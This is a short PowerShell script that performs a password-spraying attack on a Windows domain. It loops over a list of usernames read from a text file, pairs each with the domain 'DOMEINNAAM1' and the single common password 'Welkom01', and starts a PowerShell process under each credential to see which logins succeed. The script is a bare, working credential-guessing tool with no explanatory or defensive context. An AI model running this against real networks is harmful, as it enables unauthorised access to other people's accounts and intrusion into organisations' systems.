foreach($line in Get-Content 'C:\Users\test\Desktop\allusers.txt' ) {
  echo "Testing user: $line"
  $username = "DOMEINNAAM1\$line"
  $password = 'Welkom01'  

  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
  Start-Process conhost.exe 'powershell.exe' -Credential $credential
  }%    
